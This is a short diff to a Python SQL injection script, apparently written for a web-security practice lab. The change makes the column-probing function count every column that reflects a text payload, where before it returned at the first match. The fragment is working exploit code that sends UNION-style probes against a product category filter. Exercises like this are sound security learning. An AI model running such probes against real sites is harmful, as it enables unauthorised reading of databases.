@@ -27,6 +27,7 @@ def order_attack(base_url):
 
 def exploit_sqli_column_text(base_url, num_of_col, payload_entered):
     uri = "filter?category=Gifts'"
+    found = 0
     for i in range(num_of_col):
         variation = ["NULL"] * num_of_col
         variation[i] = payload_entered
@@ -38,8 +39,10 @@ def exploit_sqli_column_text(base_url, num_of_col, payload_entered):
         payload_matches = r.text.find(payload_entered[1:-1])
         if payload_matches != -1:
             print(f"[+] Exploit successful, column {i} is of type text")
-            return True
+            found += 1
 
+    if found:
+        return True
     return False
 
 
